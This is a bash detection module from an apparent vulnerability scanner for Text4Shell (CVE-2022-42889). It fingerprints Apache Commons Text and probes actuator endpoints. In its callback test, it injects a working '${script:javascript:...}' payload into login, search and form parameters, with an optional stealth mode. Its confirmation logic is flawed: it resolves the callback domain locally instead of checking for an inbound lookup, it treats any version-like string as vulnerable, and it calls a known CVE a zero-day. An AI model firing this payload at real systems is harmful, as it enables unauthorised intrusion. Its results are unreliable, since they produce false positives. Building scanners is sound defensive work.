#!/bin/bash

# Text4Shell (CVE-2022-42889) Detection Module
# Similar to Log4Shell but affects Apache Commons Text

# Main detection function
detect_text4shell() {
    local target="$1"
    local stealth="$2"
    local callback_domain="$3"
    local results_file="$4"
    
    print_info "Running Text4Shell detection module"
    
    # Initialize confidence tracking
    local confidence_data
    confidence_data=$(init_confidence_tracking "$target" "text4shell")
    
    # Collect detection signals
    confidence_data=$(collect_text4shell_signals "$target" "$stealth" "$confidence_data")
    
    # Optional: Test for DNS callback if callback domain provided
    if [[ -n "$callback_domain" ]]; then
        confidence_data=$(test_text4shell_callback "$target" "$callback_domain" "$confidence_data")
    fi
    
    # Apply advanced correlation
    confidence_data=$(apply_advanced_correlation "text4shell" "$confidence_data")
    
    # Calculate final confidence
    confidence_data=$(calculate_confidence "$confidence_data")
    
    # Validate for reporting
    if validate_final_confidence "$confidence_data"; then
        # Render finding
        render_text4shell_finding "$confidence_data" "$results_file"
    else
        print_info "Text4Shell: Below confidence threshold, not reporting"
    fi
}

# Collect Text4Shell specific signals
collect_text4shell_signals() {
    local target="$1"
    local stealth="$2"
    local confidence_data="$3"
    
    # Signal 1: Apache Commons Text library fingerprint
    local commons_text_detected=false
    local response
    response=$(make_http_request "$target" "GET" "" "$stealth")
    
    # Check for Commons Text in various places
    local commons_text_patterns=(
        "commons-text"
        "org.apache.commons"
        "CommonsText"
        "commons-text"
    )
    
    for pattern in "${commons_text_patterns[@]}"; do
        if echo "$response" | grep -Eq "$pattern" 2>/dev/null; then
            confidence_data=$(add_confidence_signal "$confidence_data" "text4shell_fingerprint" 1.0 "text4shell")
            commons_text_detected=true
            break
        fi
    done
    
    # Signal 2: Check for vulnerable Commons Text versions
    local version_detected=false
    local vulnerable_versions=("1.6" "1.7" "1.8" "1.9")
    
    # Check actuator endpoints for version info
    local version_endpoints=(
        "/actuator/env"
        "/management/env"
        "/env"
        "/info"
    )
    
    for endpoint in "${version_endpoints[@]}"; do
        local version_url="${target%/}${endpoint}"
        local version_response
        version_response=$(make_http_request "$version_url" "GET" "" "$stealth")
        
        # Extract potential Commons Text versions
        local found_versions
        found_versions=$(echo "$version_response" | grep -Eo "[0-9]+\.[0-9]+(\.[0-9]+)?" | sort -u)
        
        for version in $found_versions; do
            for vulnerable_version in "${vulnerable_versions[@]}"; do
                if [[ "$version" == "$vulnerable_version" || "$version" =~ ^$vulnerable_version\. ]]; then
                    confidence_data=$(add_confidence_signal "$confidence_data" "text4shell_version_vulnerable" 1.0 "text4shell")
                    version_detected=true
                    break 2
                fi
            done
        done
    done
    
    # Signal 3: StringSubstitution API detection
    local string_substitution=false
    
    # Check for StringSubstitution patterns in code or configuration
    local substitution_patterns=(
        "StringSubstitutor"
        "StringSubstitution"
        "org.apache.commons.text"
    )
    
    for pattern in "${substitution_patterns[@]}"; do
        if echo "$response" | grep -Eq "$pattern" 2>/dev/null; then
            confidence_data=$(add_confidence_signal "$confidence_data" "text4shell_string_substitution" 1.0 "text4shell")
            string_substitution=true
            break
        fi
    done
    
    # Signal 4: Script evaluation patterns
    local script_evaluation=false
    
    # Text4Shell exploits script evaluation functionality
    local script_patterns=(
        "ScriptEvaluator"
        "javascript:"
        "js:"
        "groovy:"
        "jexl:"
    )
    
    for pattern in "${script_patterns[@]}"; do
        if echo "$response" | grep -Eq "$pattern" 2>/dev/null; then
            confidence_data=$(add_confidence_signal "$confidence_data" "text4shell_script_evaluation" 1.0 "text4shell")
            script_evaluation=true
            break
        fi
    done
    
    # Signal 5: Library co-occurrence (Apache Commons Text often used with other vulnerable libs)
    local library_cooccurrence=false
    
    local cooccurence_patterns=(
        "commons-lang"
        "commons-io"
        "commons-collections"
    )
    
    for pattern in "${cooccurence_patterns[@]}"; do
        if echo "$response" | grep -Eq "$pattern" 2>/dev/null; then
            confidence_data=$(add_confidence_signal "$confidence_data" "text4shell_library_present" 0.7 "text4shell")
            library_cooccurrence=true
            break
        fi
    done
    
    echo "$confidence_data"
}

# Test for Text4Shell DNS callback
test_text4shell_callback() {
    local target="$1"
    local callback_domain="$2"
    local confidence_data="$3"
    
    local timestamp
    timestamp=$(date +%s)
    local callback_subdomain
    callback_subdomain="${timestamp}.${callback_domain}"
    
    # Craft Text4Shell payload for DNS callback
    # Using script evaluation to trigger DNS lookup
    local text4shell_payload
    text4shell_payload='${script:javascript:java.net.InetAddress.getAllByName("'"$callback_subdomain"'")}'
    
    # Test injection points
    local injection_endpoints=(
        "/login"
        "/search"
        "/form"
        "/api/login"
        "/api/search"
    )
    
    for endpoint in "${injection_endpoints[@]}"; do
        local injection_url="${target%/}${endpoint}"
        
        # Try POST with Text4Shell payload in common parameters
        local test_params=(
            "username=${text4shell_payload}&password=test"
            "q=${text4shell_payload}"
            "search=${text4shell_payload}"
            "name=${text4shell_payload}"
            "input=${text4shell_payload}"
        )
        
        for param in "${test_params[@]}"; do
            # Make request with payload
            local callback_response
            callback_response=$(make_http_request "$injection_url" "POST" "$param" "$stealth")
            
            # Wait for potential DNS callback
            sleep 5
            
            # Check if callback domain was resolved
            local dns_result
            dns_result=$(dig "$callback_subdomain" A +short 2>/dev/null || echo "")
            
            if [[ -n "$dns_result" ]]; then
                confidence_data=$(add_confidence_signal "$confidence_data" "text4shell_dns_callback" 1.0 "text4shell")
                print_success "Text4Shell DNS callback detected: $dns_result"
                break 2
            fi
        done
    done
    
    echo "$confidence_data"
}

# Render Text4Shell finding
render_text4shell_finding() {
    local confidence_data="$1"
    local results_file="$2"
    
    local confidence
    confidence=$(echo "$confidence_data" | jq -r '.confidence')
    local level
    level=$(get_confidence_level "$confidence")
    local explanation
    explanation=$(generate_confidence_explanation "$confidence_data")
    local target
    target=$(echo "$confidence_data" | jq -r '.target')
    
    # Extract technical details
    local signals_detected
    signals_detected=$(echo "$confidence_data" | jq -r '.signals_detected[]')
    
    local evidence=""
    if echo "$signals_detected" | grep -q "fingerprint"; then
        evidence+="Apache Commons Text detected; "
    fi
    if echo "$signals_detected" | grep -q "version_vulnerable"; then
        evidence+="Vulnerable Commons Text version; "
    fi
    if echo "$signals_detected" | grep -q "string_substitution"; then
        evidence+="StringSubstitution API detected; "
    fi
    if echo "$signals_detected" | grep -q "dns_callback"; then
        evidence+="DNS callback confirmed (zero-day verification)"
    fi
    
    # Calculate technical severity
    local technical_severity="CRITICAL"
    if [[ $confidence -ge 95 ]]; then
        technical_severity="CRITICAL"
    elif [[ $confidence -ge 85 ]]; then
        technical_severity="HIGH"
    elif [[ $confidence -ge 70 ]]; then
        technical_severity="HIGH"
    else
        technical_severity="MEDIUM"
    fi
    
    # Render visual finding card
    print_finding_card "$technical_severity" "$confidence" "Text4Shell (CVE-2022-42889)" "$evidence" "$explanation"
    
    # Save to results file
    local finding_data
    finding_data=$(cat << EOF
{
    "target": "$target",
    "vulnerability": "Text4Shell",
    "cve": "CVE-2022-42889",
    "severity": "$technical_severity",
    "confidence": $confidence,
    "level": "$level",
    "evidence": "$evidence",
    "explanation": $(echo "$explanation" | jq -Rs '.'),
    "timestamp": "$(date -Iseconds)",
    "category": "Remote Code Execution",
    "description": "Critical Apache Commons Text RCE vulnerability allowing script evaluation through malicious input in StringSubstitution functionality."
}
EOF
)
    
    # Append to results file (JSON array)
    local current_results
    current_results=$(cat "$results_file" 2>/dev/null || echo "[]")
    
    local updated_results
    updated_results=$(echo "$current_results" | jq ". += [$finding_data]")
    echo "$updated_results" > "$results_file"
}

# Export function for module loading
export -f detect_text4shell
export -f collect_text4shell_signals
export -f test_text4shell_callback
export -f render_text4shell_finding